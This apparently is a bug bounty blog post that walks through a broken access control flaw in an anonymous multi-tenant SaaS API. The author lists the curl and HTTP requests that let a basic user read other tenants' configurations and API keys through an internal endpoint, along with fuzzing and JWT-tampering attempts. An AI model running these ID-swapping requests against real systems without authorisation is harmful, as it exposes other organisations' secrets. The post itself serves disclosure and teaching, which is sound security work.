---
layout: post
title: " $2K API Access Control Bypass "
date: 2025-04-15
categories: bug-bounty
tags: [api, bac, bug-bounty, cybersecurity]
---


 After  weeks of banging my head against a SaaS platform’s API, I finally cracked a gnarly broken access control bug that let me escalate from a nobody user to reading *admin-only* tenant configs. It was a brutal hunt—failed attempts, sketchy workarounds, and pure stubbornness got me there. Target’s staying anonymous (private program), but here’s the raw, unfiltered story for you to chew on.


The target was a SaaS app for multi-tenant cloud management—think teams sharing dashboards for cloud resources. Their bug bounty scope listed a REST API, and I figured access control was my best shot. Spoiler: I was right, but it wasn’t easy. The vuln let any authenticated user query admin-only tenant configuration data (like API keys and compliance settings) by abusing a hidden endpoint with a tricky ID manipulation. Took me forever to spot, but it was worth it.



I started with a trial account (role: `basic_user`, tenant ID: `t-987654`). The app’s frontend was locked down tight—no obvious IDORs in the UI. DevTools showed API calls to `/v2/resources/` with my tenant ID, but nothing juicy. The API docs (buried in a help page) mentioned roles (`basic_user`, `tenant_admin`, `global_admin`), so I figured BAC was likely between tenants or roles.

First, I tried the obvious: swapping `tenant_id` in requests like `/v2/resources/t-987654`. Got `403 Forbidden` every time unless it was *my* tenant. Smart move, I thought—they’re checking ownership. I sniffed around for other endpoints using ffuf and a wordlist tailored for SaaS APIs (`internal`, `admin`, `config`, etc.). Nada. Hours wasted.

Then I got desperate and proxied everything through Burp. One call caught my eye—a POST to `/internal/tenants/t-987654/config` when I updated my profile. It was weird; why was a user hitting an `internal` endpoint? The request looked like:

```http
POST /internal/tenants/t-987654/config HTTP/1.1
Host: api.cloudapp.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzNDUiLCJyb2xlIjoiYmFzaWNfdXNlciIsInRlbmFudCI6InQtOTg3NjU0In0.signature
Content-Type: application/json

{"display_name": "My Tenant"}

```

Response was a boring 200 OK. I tried changing tenant_id to t-123456 (a random guess):
http

```http
POST /internal/tenants/t-123456/config HTTP/1.1
Host: api.cloudapp.com
Authorization: Bearer my_jwt_token
Content-Type: application/json

{"display_name": "Test"}
```
Got 403 Forbidden. Looked like they were validating tenant_id against my JWT’s tenant claim. I was stuck.

I wasn’t giving up. I started decoding JWTs to see what I could mess with. The token had:

```json

{
  "user_id": "12345",
  "role": "basic_user",
  "tenant": "t-987654",
  "exp": 1746988800
}
```

No way to forge a tenant_admin role without cracking the signing key (HS256, no luck brute-forcing). But I noticed the /internal/tenants/ endpoint had a GET method in the API docs, marked “admin only.” I tried:
bash

```bash
curl -H "Authorization: Bearer my_jwt_token" \
     https://api.cloudapp.com/internal/tenants/t-987654/config
```

Returned my tenant’s config:

```json

{
  "tenant_id": "t-987654",
  "name": "My Tenant",
  "api_key": "sk_abc123xyz",
  "compliance": {
    "soc2_enabled": false
  }
}
```

Okay, that’s sensitive—an API key for my tenant. I tried another tenant_id (t-123456):
bash

```bash
curl -H "Authorization: Bearer my_jwt_token" \
     https://api.cloudapp.com/internal/tenants/t-123456/config
```

Expected a 403. Instead, I got:

```json

{
  "tenant_id": "t-123456",
  "name": "BigCorp Inc",
  "api_key": "sk_def456uvw",
  "compliance": {
    "soc2_enabled": true,
    "audit_log_retention": 90
  }
}
```

My jaw dropped. A basic_user could read any tenant’s config, including live API keys. But it was inconsistent—some IDs gave 404, others 403. I realized the endpoint only worked for tenants with global_admin-created configs (a quirk I stumbled on later).

The trick was realizing the /internal/ path bypassed the usual tenant_id checks for GET requests. POSTs were locked down, but GETs slipped through because of a logic flaw: the backend assumed any authenticated user could read configs if the tenant existed. No role validation for global_admin perms

* Biggest win? Not quitting. This bug hid behind layers of “looks secure” nonsense. If I hadn’t rechecked the docs for the 10th time, I’d have missed it.




